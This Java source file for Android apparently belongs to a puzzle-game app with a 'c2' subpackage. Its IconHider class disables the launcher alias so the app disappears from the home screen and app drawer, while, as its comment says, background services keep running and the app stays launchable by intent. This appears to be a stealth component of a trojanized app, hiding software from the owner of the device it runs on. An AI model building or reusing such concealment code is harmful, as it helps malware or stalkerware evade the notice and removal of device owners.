package com.gempuzzle.quest.c2;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;

/**
 * Icon hide / unhide — toggles the LAUNCHER activity-alias
 * component. Hiding removes the app from home screen and
 * app drawer; services keep running.
 */
public final class IconHider {

    public static void hide(Context ctx) {
        setComponent(ctx, false);
    }

    public static void unhide(Context ctx) {
        setComponent(ctx, true);
    }

    public static boolean isHidden(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        ComponentName cn = new ComponentName(ctx, "com.gempuzzle.quest.GameLauncher");
        return pm.getComponentEnabledSetting(cn) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
    }

    private static void setComponent(Context ctx, boolean enabled) {
        PackageManager pm = ctx.getPackageManager();
        ComponentName alias = new ComponentName(ctx, "com.gempuzzle.quest.GameLauncher");
        ComponentName main = new ComponentName(ctx, "com.gempuzzle.quest.MainActivity");
        int state = enabled ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        // Disable the alias (the visible launcher entry), keep main activity
        // enabled so it can still be launched via intent if needed.
        pm.setComponentEnabledSetting(alias, state, PackageManager.DONT_KILL_APP);
        if (!enabled) {
            // Also disable main activity's LAUNCHER category by disabling component
            // but keep it callable — use alias only for launcher.
            pm.setComponentEnabledSetting(main,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
        }
    }

    private IconHider() {}
}
